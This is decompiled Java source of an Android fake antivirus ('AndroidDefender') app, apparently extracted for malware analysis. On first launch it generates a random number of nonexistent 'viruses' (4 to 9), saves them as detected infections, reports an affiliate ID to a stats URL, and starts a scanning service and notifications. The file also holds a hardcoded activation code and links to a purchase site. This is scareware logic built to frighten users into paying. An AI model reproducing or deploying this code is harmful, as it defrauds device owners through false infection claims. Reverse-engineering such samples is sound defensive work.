package com.example.androiddefender2;

import android.app.ActivityManager;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.graphics.Typeface;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.widget.TabHost;
import com.worker.androiddefender2.AVService;
import com.worker.androiddefender2.SignaturesWorker;
import com.worker.androiddefender2.SkanerSystemWorker;
import com.worker.androiddefender2.SystemFunctions;
import com.worker.androiddefender2.VersionWorker;
import com.worker.helper.HelperFactory;
import com.worker.helper.Tables.VirusesIndex;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import system.AppSingleton;
import system.Communicator;

public class DefenderApplication extends Application {
  public static String APP_PREF = "AppPref";
  
  public static final int JUST_POPUP_INFORMER = 1;
  
  public static final int POPUP_INFORMER_AFTER_CALL = 2;
  
  public static final int POPUP_INFORMER_AFTER_SMS = 3;
  
  public static final int POPUP_INFORMER_INET_TRAFFIC = 4;
  
  private static DefenderApplication defenderApp;
  
  public static boolean isCurAutoScan = false;
  
  public String activation_code = "7152";
  
  public String affID = "";
  
  public boolean appActivate = false;
  
  public String bySite = "";
  
  public int countViruses = 0;
  
  public boolean goToByTab = false;
  
  public ArrayList<Integer> indexesVr = new ArrayList<Integer>();
  
  private boolean mInBackground = false;
  
  private ArrayList<ApplicationLifecycleCallbacks> mListeners;
  
  public boolean makeFirstScan = false;
  
  public boolean skaner_worker = false;
  
  public String statsApi = "";
  
  public TabHost tabHost = null;
  
  public boolean tab_listener = false;
  
  public Typeface type_arial = null;
  
  public Typeface type_trebuc = null;
  
  public boolean virusDolbal = false;
  
  public boolean virusesDefine = false;
  
  public static DefenderApplication getInstance() {
    return defenderApp;
  }
  
  public void firstCreateAppSettings() {
    if (!(AppSingleton.getInstance()).activaten) {
      SharedPreferences.Editor editor = getSharedPreferences(APP_PREF, 0).edit();
      editor.putBoolean("chkAutostart", true);
      editor.putBoolean("chkStartWhenStart", true);
      editor.putBoolean("chkMinimizeWhenStart", true);
      editor.putBoolean("chkMessages", true);
      editor.commit();
    } 
  }
  
  public void generateFirstBaseVersion() {
    SharedPreferences sharedPreferences = getSharedPreferences("Updates", 0);
    SharedPreferences.Editor editor = sharedPreferences.edit();
    if (!sharedPreferences.contains("versionbase"))
      editor.putString("versionbase", (new VersionWorker()).generateVersionFromString("10.0.0.0")); 
    if (!sharedPreferences.contains("count_signatures"))
      editor.putString("count_signatures", String.valueOf((new SignaturesWorker()).generateSignatureFromString("150"))); 
    editor.commit();
  }
  
  public void getVirusesIndexesFromDB() {
    if (this.indexesVr != null)
      this.indexesVr.clear(); 
    try {
      Iterator<VirusesIndex> iterator = HelperFactory.getHelper().getVirusesIndexesDao().getAllIndexes().iterator();
      while (iterator.hasNext()) {
        int i = ((VirusesIndex)iterator.next()).getVirusID().intValue();
        this.indexesVr.add(Integer.valueOf(i));
      } 
    } catch (SQLException sQLException) {
      SystemFunctions.generateToastException(sQLException.getMessage());
    } catch (Exception exception) {
      SystemFunctions.generateToastException(exception.getMessage());
    } 
  }
  
  public boolean isApplicationBroughtToBackground() {
    List list = ((ActivityManager)getApplicationContext().getSystemService("activity")).getRunningTasks(1);
    return (!list.isEmpty() && !((ActivityManager.RunningTaskInfo)list.get(0)).topActivity.getPackageName().equals(getApplicationContext().getPackageName()));
  }
  
  public boolean isOnline() {
    NetworkInfo networkInfo = ((ConnectivityManager)getSystemService("connectivity")).getActiveNetworkInfo();
    return (networkInfo != null && networkInfo.isConnectedOrConnecting());
  }
  
  public void loadPreferences() {
    SharedPreferences sharedPreferences = getSharedPreferences(APP_PREF, 0);
    this.virusesDefine = sharedPreferences.getBoolean("virusesDefine", false);
    this.appActivate = sharedPreferences.getBoolean("appActivaten", false);
    this.countViruses = sharedPreferences.getInt("countViruses", 0);
    this.makeFirstScan = sharedPreferences.getBoolean("makeFirstScan", false);
    this.virusDolbal = sharedPreferences.getBoolean("virusDolbal", false);
  }
  
  public final void onConfigurationChanged(Configuration paramConfiguration) {
    super.onConfigurationChanged(paramConfiguration);
  }
  
  public final void onCreate() {
    super.onCreate();
    defenderApp = this;
    AppSingleton.initInstance();
    this.affID = SystemFunctions.getSettingOtstukTag(getApplicationContext(), "affid");
    this.statsApi = SystemFunctions.getSettingOtstukTag(getApplicationContext(), "statsapi");
    this.bySite = SystemFunctions.getSettingOtstukTag(getApplicationContext(), "buysite");
    SystemFunctions.createVirusesList(getApplicationContext());
    loadPreferences();
    if (!this.virusesDefine) {
      this.countViruses = SystemFunctions.generateRandomCountVirus(4, 9);
      if (this.countViruses > 0) {
        this.indexesVr = SystemFunctions.generateVirusForIndex(this.countViruses);
        AppSingleton.getInstance().getDB(getApplicationContext());
        try {
          HelperFactory.getHelper().getVirusesIndexesDao().deleteAll();
          for (byte b = 0; b < this.countViruses; b++) {
            VirusesIndex virusesIndex = new VirusesIndex();
            this();
            virusesIndex.setVirusID(this.indexesVr.get(b));
            virusesIndex.setCurred(false);
            HelperFactory.getHelper().getVirusesIndexesDao().create(virusesIndex);
          } 
        } catch (SQLException sQLException) {
          SystemFunctions.generateToastException(sQLException.getMessage());
        } catch (Exception exception) {
          SystemFunctions.generateToastException(exception.getMessage());
        } 
        savePreferences();
        firstCreateAppSettings();
        this.virusesDefine = true;
        (new Thread(new Runnable() {
              public void run() {
                try {
                  StringBuilder stringBuilder = new StringBuilder();
                  this();
                  String str = stringBuilder.append((DefenderApplication.getInstance()).statsApi).append("&affid=").append((DefenderApplication.getInstance()).affID).toString();
                  Communicator communicator = new Communicator();
                  this();
                  communicator.executeHttpGet(str);
                } catch (Exception exception) {}
              }
            })).start();
      } 
    } else {
      AppSingleton.getInstance().getDB(getApplicationContext());
      getVirusesIndexesFromDB();
    } 
    defenderApp.type_trebuc = Typeface.createFromAsset(getAssets(), "fonts/TREBUC.TTF");
    defenderApp.type_arial = Typeface.createFromAsset(getAssets(), "fonts/arial.ttf");
    if (this.appActivate)
      (AppSingleton.getInstance()).activaten = this.appActivate; 
    generateFirstBaseVersion();
    (new SkanerSystemWorker()).startScanNotif(getApplicationContext());
    startService(new Intent((Context)this, AVService.class));
  }
  
  public final void onLowMemory() {
    HelperFactory.releaseHelper();
    super.onLowMemory();
  }
  
  public final void onTerminate() {
    HelperFactory.releaseHelper();
    super.onTerminate();
  }
  
  protected void savePreferences() {
    SharedPreferences.Editor editor = getSharedPreferences(APP_PREF, 0).edit();
    editor.putBoolean("virusesDefine", true);
    editor.putInt("countViruses", this.countViruses);
    editor.commit();
  }
  
  public static interface ApplicationLifecycleCallbacks {
    void onApplicationPause();
    
    void onApplicationResume();
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/DefenderApplication.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */